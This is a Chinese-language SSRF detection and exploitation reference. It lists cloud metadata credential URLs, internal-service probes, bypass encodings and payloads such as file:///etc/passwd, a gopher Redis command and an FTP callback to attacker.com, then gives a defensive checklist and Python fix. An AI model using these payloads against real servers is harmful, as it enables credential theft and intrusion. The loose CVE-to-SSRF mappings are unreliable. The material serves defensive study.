# SSRF (Server-Side Request Forgery) — Detection & Exploitation

> 来源: Shannon OSS + OWASP Top 10 (2021) A10

## 漏洞概述

SSRF 发生在攻击者诱导服务端向非预期的内部资源发起请求时。服务端通常被
认为比客户端拥有更高的网络权限——能访问内网服务、云元数据端点、内部 API
等——SSRF 正是滥用这种信任关系。

## 常见 SSRF 入口点

- **URL 参数**: `?url=http://example.com`, `?callback=http://...`, `?redirect=...`
- **Webhook 配置**: `?webhook_url=https://...`
- **文件导入**: PDF/图片导入时的远程获取
- **代理端点**: `/proxy?target=http://...`
- **SSO/OIDC 发现**: 从外部 URL 获取配置
- **Web 爬虫/预览生成器**: 服务端渲染链接预览
- **API 聚合器**: 从用户提供的 URL 拉取数据

## 攻击分类 (Shannon 分类法)

### 1. 经典 SSRF (Classic)
服务端返回请求的响应内容。攻击者能直接读取内部服务的数据。

### 2. 盲 SSRF (Blind)
服务端发起请求但攻击者看不到响应。需要外带 (OOB) 服务器确认：
- Burp Collaborator
- Interactsh (interactsh-client)
- webhook.site
- 自建 DNS/HTTP 日志服务器

### 3. 半盲 SSRF (Semi-Blind)
通过时序差异、错误消息或状态码差异推断内部服务可达性。

### 4. 存储型 SSRF (Stored)
恶意 URL 存储在数据库/配置中，稍后被服务端任务触发。

## 攻击目标

### 云元数据端点
```
AWS IMDSv1:   http://169.254.169.254/latest/meta-data/
AWS IAM:      http://169.254.169.254/latest/meta-data/iam/security-credentials/
Azure:        http://169.254.169.254/metadata/instance?api-version=2021-02-01
              需要头: Metadata: true
GCP:          http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
              需要头: Metadata-Flavor: Google
DigitalOcean: http://169.254.169.254/metadata/v1.json
Oracle:       http://169.254.169.254/opc/v1/instance/
Alibaba:      http://100.100.100.200/latest/meta-data/
```

### 内部服务探测
```
HTTP 管理面板:  http://127.0.0.1:8080/admin
                http://localhost/admin
                http://192.168.1.1/api/status
数据库端口扫描: MySQL:3306, PostgreSQL:5432, Redis:6379, MongoDB:27017
其他服务:       Elasticsearch:9200, Prometheus:9090, Docker:2375
```

### 危险协议 (Shannon payload)
```
file:///etc/passwd                    # 本地文件读取
gopher://127.0.0.1:6379/_INFO         # Redis 攻击
dict://127.0.0.1:6379/info            # 字典协议
ftp://attacker.com/ssrf               # FTP 回连
```

## URL 解析绕过 (Shannon 绕过技术)

```
直接 IP:     http://127.0.0.1:8080/admin
短 IPv4:     http://127.1/admin
十进制 IP:   http://2130706433/admin          (127*256^3 + 0*256^2 + 0*256 + 1)
十六进制 IP: http://0x7f000001/admin
八进制 IP:   http://017700000001/admin
IPv6 环回:   http://[::1]:8080/admin
DNS 重绑定:  http://127.0.0.1.xip.io/admin
双编码:      http://127.0.0.1%2fadmin → http://127.0.0.1/admin
Unicode:     http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
```

## 防御检查清单 (Shannon 检测标准)

1. **协议白名单**: 仅允许 http:// 和 https://
2. **主机名/IP 验证**: 禁止内网 IP 段 (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
3. **端口限制**: 仅允许 80, 443 (必要时 8080, 8443)
4. **URL 解析规范**: 先解析再验证，避免绕过
5. **响应处理**: 不返回原始响应体给客户端
6. **请求头剥离**: 移除 Authorization、Cookie 等敏感头
7. **DNS 重绑定防护**: 两次解析 IP 一致性检查
8. **超时设置**: 防止连接挂起探测内网

## 修复方案

```python
# Python: 安全的 URL 获取 (使用 parsed IP 验证)
import ipaddress
from urllib.parse import urlparse
import socket

BLOCKED_NETS = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),
]

def safe_fetch(url: str) -> bytes:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("unsupported scheme")
    # Resolve hostname to IP
    ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    # Check against blocked networks
    for net in BLOCKED_NETS:
        if ip in net:
            raise ValueError("internal address blocked")
    # Fetch with timeout
    import requests
    return requests.get(url, timeout=3).content
```

## 参考 CVE

- CVE-2021-21315: systeminformation SSRF → RCE
- CVE-2022-22965: Spring4Shell (partial SSRF vector)
- CVE-2021-44228: Log4Shell (LDAP callback = SSRF variant)
